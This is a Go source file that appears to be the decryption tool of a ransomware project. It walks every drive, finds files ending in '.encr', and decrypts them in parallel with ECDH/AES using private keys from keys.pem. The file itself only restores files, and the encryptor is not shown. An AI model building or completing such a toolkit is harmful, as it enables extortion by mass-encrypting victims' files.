package main

import (
	"crypto/ecdsa"
	"fmt"
	"io/fs"
	"path/filepath"
	"ransomware/encryption"
	"ransomware/encryption/eccLib"
	"ransomware/io"
	"ransomware/utils"
	"runtime"
	"strings"
	"sync"
)

var (
	waitGroup  sync.WaitGroup
	NumWorkers = runtime.NumCPU()
)

func main() {

	var privKeys []*ecdsa.PrivateKey
	var err error

	if privKeys, err = eccLib.ReadMultPrivKeys("keys.pem"); err != nil {
		panic(err)
	}

	drives := utils.GetDrives()
	decryptFiles(drives, privKeys)

}

func decryptFiles(dirPaths []string, privKeys []*ecdsa.PrivateKey) {

	var filesToVisit = make(chan io.File)
	var ext string
	waitGroup.Add(1)
	go func() {
		for _, dirPath := range dirPaths {
			filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, err error) error {

				if d.IsDir() {

					if utils.Contains(utils.FoldersToSkip, filepath.Base(path)) {
						return filepath.SkipDir
					}
				}

				if !d.IsDir() {
					ext = filepath.Ext(path)

					if ext == ".encr" {
						info, err := d.Info()
						if err != nil {
							return err
						}

						split := strings.Split(path, ".")
						if len(split) >= 2 {
							ext = split[len(split)-2]
							ext = strings.ToLower(ext)
							filesToVisit <- io.File{Info: info, Path: path, Extension: ext}
						}
					}
				}
				return nil
			})
		}
		close(filesToVisit)
		defer waitGroup.Done()
	}()

	for i := 0; i < NumWorkers; i++ {
		waitGroup.Add(1)
		go func() {
			for file := range filesToVisit {

				fileType, mapContains := utils.FileType[file.Extension]
				if mapContains && privKeys[fileType] != nil {
					err := io.DecryptFile(&file, encryption.ECDHAESDecrypt, privKeys[fileType])
					if err != nil {
						fmt.Println("Error decrypting file", file.Path, "Error:", err)
					}
				}

			}
			defer waitGroup.Done()
		}()
	}

	waitGroup.Wait()
}
